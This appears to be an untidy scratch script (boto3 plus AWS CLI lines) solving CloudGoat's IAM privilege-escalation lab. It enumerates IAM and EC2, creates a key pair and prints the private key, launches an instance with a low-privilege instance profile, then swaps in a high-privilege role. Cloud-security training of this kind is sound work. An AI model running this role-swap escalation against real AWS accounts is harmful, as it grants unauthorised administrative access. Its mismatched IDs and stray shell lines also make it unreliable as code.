#scene3 iam_privesc_by_attachment

#aws ec2 describe-security-groups --profile Kerrigan

#aws ec2 run-instances --image-id ami-0a313d6098716f372 --iam-instance-profile Arn=<instanceProfileArn> --key-name pwned --profile kerrigan --subnet-id <subnetId> --security-group-ids <securityGroupId>
#aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-cgid7bu0g9wcn4 --role-name cg-ec2-meek-role-cgid7bu0g9wcn4
#aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-cgid7bu0g9wcn4 --role-name cg-ec2-mighty-role-cgid7bu0g9wcn4
#'ec2-54-161-72-10.compute-1.amazonaws.com'
#"InstanceId": "i-097f4de02937ee100"

import boto3
from pprint import pprint


session = boto3.session.Session(profile_name='kerrigan')
ec2_cli = session.client(region_name='us-east-1', service_name='ec2')
iam_cli = session.client(region_name='us-east-1', service_name='iam')
pprint(iam_cli.get_policy_version(PolicyArn='arn:aws:iam::567796756587:policy/cg-ec2-mighty-policy', VersionId='v1'))
print(ec2_cli.delete_key_pair(KeyName='CloudgoatScene3'))

print(ec2_cli.terminate_instances(InstanceIds=["i-097f4de02937ee100"]))
ec2_re = session.resource(region_name='us-east-1', service_name='ec2')
pprint(ec2_re.get_available_subresources())
pprint(ec2_cli.describe_instances())
pprint(iam_cli.list_policies(Scope='Local'))
pprint(iam_cli.get_role_policy(RoleName='cg-ec2-mighty-role-cgid82ug7z7vkg', PolicyName='cg-ec2-mighty-policy'))
for re_ in ec2_re.instances.all():
    pprint(re_)
iam_cli = session.client(service_name='iam')
pprint(iam_cli.get_user())
pprint(iam_cli.list_user_policies(UserName='kerrigan'))
pprint(iam_cli.list_roles())
pprint(iam_cli.list_user_policies(UserName='kerrigan'))

filter = [
        {
            'Name': 'group-name',
            'Values': [
                'cg-ec2-ssh-cgid82ug7z7vkg', 'cg-ec2-http-cgid82ug7z7vkg'
            ]
        },
    ]

pprint(ec2_cli.describe_security_groups(Filters=filter))
ec2_key = ec2_cli.create_key_pair(KeyName='CloudgoatScene3')
print(ec2_key['KeyMaterial'])
pprint(ec2_cli.describe_iam_instance_profile_associations())
Image_Id = 'ami-0a313d6098716f372'
Instance_Type = 't2.micro'
#Role_Name = 'cg-ec2-meek-role-cgid82ug7z7vkg'
Arn = 'arn:aws:iam::567796756587:instance-profile/cg-ec2-meek-instance-profile-cgid82ug7z7vkg'
Subnet_Id = 'subnet-0363ac0d49b7d297c'
Group_Id = 'sg-0586b588cbacfa567'
Network_Interfaces=[
        {
            'AssociatePublicIpAddress': True,
            'DeviceIndex' : 0,
            'Groups': [Group_Id],
            'SubnetId': Subnet_Id
        }
        ]
ec2_new_ins = ec2_cli.run_instances(ImageId=Image_Id, InstanceType=Instance_Type, IamInstanceProfile={'Arn': Arn},
    MaxCount=1,
    MinCount=1,
    KeyName='CloudgoatScene3',
    NetworkInterfaces=Network_Interfaces)
pprint(ec2_new_ins)

pprint(iam_cli.list_instance_profiles())
print(iam_cli.remove_role_from_instance_profile(InstanceProfileName='cg-ec2-meek-instance-profile-cgid82ug7z7vkg', RoleName='cg-ec2-meek-role-cgid82ug7z7vkg'))
print(iam_cli.add_role_to_instance_profile(InstanceProfileName='cg-ec2-meek-instance-profile-cgid82ug7z7vkg', RoleName='cg-ec2-mighty-role-cgid82ug7z7vkg'))
pprint(iam_cli.list_role_policies(RoleName='cg-ec2-mighty-role-cgid82ug7z7vkg'))

sudo apt-get update

sudo apt-get install awscli

aws ec2 describe-instances --region us-east-1

aws ec2 terminate-instances --instance-ids <instanceId> --region us-east-1
